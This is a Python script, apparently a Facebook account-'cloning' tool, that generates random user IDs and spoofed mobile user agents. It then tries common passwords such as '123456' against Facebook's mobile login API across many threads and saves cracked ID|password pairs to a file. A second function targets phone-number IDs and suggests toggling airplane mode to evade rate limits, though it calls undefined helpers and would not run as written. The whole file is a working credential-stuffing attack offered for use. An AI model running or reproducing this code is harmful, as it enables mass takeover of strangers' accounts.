#Decode By Saju x Error
""" code write by @bayjid__143"""
#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
ugen =[]
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------------[DATE]-----------------------------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'-'+str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
s=f"{green}[𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝-v1-OK]"
r=f"{green}[𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝-v1✓-OK]"
ok=random.choice([s,r])
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
for xd in range(5000):
    
    aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

for agent in range(10000):
    
        aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia','Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
    e=random.randrange(100, 9999)
    #f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  import getpass
os.system("xdg-open https://t.me/+PCHk9_nDCMM3NDI1")
os.system("espeak \"PLEASE,,,ENTAR,,,, THE,,,,USER,,,,AND,,,,PASSWOAR\"")
attemps = 0
 
while attemps < 12345677901:
    username = input(' \033[0;92m𝐄𝐧𝐭𝐞𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: ')
    password = input(' \033[0;93m𝐄𝐧𝐭𝐞𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: ')
 
    if username == 'PRINCE' and password == 'PRINCE':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
os.system("espeak \"USER,,AND,,PASSWORAD,,,LOGIN,,successful \"")
os.system("xdg-open https://t.me/+PCHk9_nDCMM3NDI1")
#----------------------------[LOGO]-----------------------------------#
logo =f"""
      \033[1;31m             ▂▉▉▉▉▂
       \033[1;32m         ╰▏ ┛┗ ▕╯
   \033[1;33m              ╲ 👅 ╱
       \033[1;34m          ╱▔╲╱▔╲
    \033[1;35m           ╱ ╱▏╭╮▕╲ ╲
\033[1;36m               ╲ ╲▏╭╮▕╱ ╱      
        \033[1;32m         ╲▉▉▉▉╱       
            \033[1;32m      ▏╭╮▕         
        \033[1;37m          ▏▏▕▕
           \033[1;33m       ▏▏▕▕
      \033[1;36m           ╭╰ ╮╭╰ ╮
   \033[1;34m     𝐀𝐝𝐧𝐚𝐧 𝐀𝐥𝐰𝐚𝐲𝐬 𝐎𝐧 𝐅𝐢𝐫𝐞
●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●   
\x1b[97m\033[37;41m 🌺 𝐄𝐈 𝐒𝐂𝐑𝐈𝐏𝐓 𝐓𝐈 𝐍𝐈𝐓𝐄 𝐀𝐃𝐌𝐈𝐍 𝐊𝐄 𝐌𝐄𝐀𝐒𝐒𝐀𝐆𝐄 𝐊𝐎𝐑𝐔𝐍  💐 \033[0;m   \33[1;92m 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     ┏━━━━━━━━━━━━━━━━━━━𝑨𝒅𝒏𝒂𝒏_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━━━━━━━━━━━━━━━━
     ┃ ❣︎[𖣘]☔︎𝙉𝘼𝙈𝙀        : [★] 𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝 > decode by error team                
     ┃ ❣︎[𖣘]☔︎𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆    : [★] 𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝           
     ┃ ❣︎[𖣘]☔︎𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜      
     ┃ ❣︎[𖣘]☔︎𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐔𝐒𝐄𝐑 :[★] @𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠_𝟎𝟗𝟕     
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀  : [★] 𝐎𝐋𝐃 𝐈𝐃 & 𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚     
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎: [★] 𝐅𝐑𝐄𝐄 𝐁𝐔𝐓 𝐔𝐒𝐄 & 𝐏𝐀𝐒𝐒 𝐍𝐄𝐃𝐃𝐄𝐃              
     ┗━━━━━━━━━━━━━━━━━━━𝑨𝒅𝒏𝒂𝒏_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f' {faltu}{rad}$${pvt}{green}𝐄𝐱𝐚𝐦𝐩𝐥𝐞 {white}  ▶︎ {green}10000 - 20000 - 30000')
    lin()
    limit=input(f" {faltu}{rad}{pvt}{green}𝐄𝐧𝐭𝐞𝐫 𝐋𝐢𝐦𝐢𝐭𝐞    {white}▶︎ {green}")
    lin()
    os.system
    {'xdg-open https://www.facebook.com/profile.php?id=100006128411641'} 
    os.system('clear')
    print(logo)
    print(f" {faltu}{rad}1{pvt} {green}EXAMPLE {white}  ▶︎ {green} METHOD-1▶︎ (𝐎𝐋𝐃 𝐈𝐃 𝐁𝐄𝐒𝐓) (2007-2014)")
    print(f" {faltu}{rad}1{pvt} {green}EXAMPLE {white}  ▶︎ {green} METHOD-2 ▶︎ 𝐑𝐀𝐍𝐃𝐎𝐌 (𝐍𝐄𝐖-𝐌𝐈𝐗)𝐈𝐃 ")
    lin()
    ask=input(f" {faltu}{rad}1{pvt} {green}CHOICE    {white}▶︎ {green}")
    lin()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as sami:
        os.system('clear')
        print(logo)
        print(f' {faltu}{rad}${pvt} {green}TOTAL UID {white}▶{rad} ︎{limit} {faltu}{rad}∏{pvt} {green} METHOD {white}▶{yellow}︎ {ask}')
        #print(f' {falt#u}{rad}∏{pvt} {green}IF NO  RESULT AFTER 5 MINUTES ON/OF ✈MODE[{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
        lin()
        for mal in user:
            uid=star+mal
            sami.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)")
        sys.stdout.flush()
        pro = random.choice(ugen)
        for pw in ["123456","1234567","12345678","123456789","123123","143143","1234567890"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": pro, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{ok} \x1b[38;5;46m{uid} | {pw}")
                open("/sdcard/𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝-v1-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{ok} \x1b[38;5;46m{uid} | {pw}")
                open("/sdcard/𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝-v1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{ok} \x1b[38;5;46m{uid} | {pw}")
                open("/sdcard/𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝-v1XD-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
#----------------------------[CODE/END]-----------------------------------#-#

def __bdx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 / 018');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Habibx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            if methodx in ['1']:Habibx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:Habibx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:Habibx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:Habibx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:Habibx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
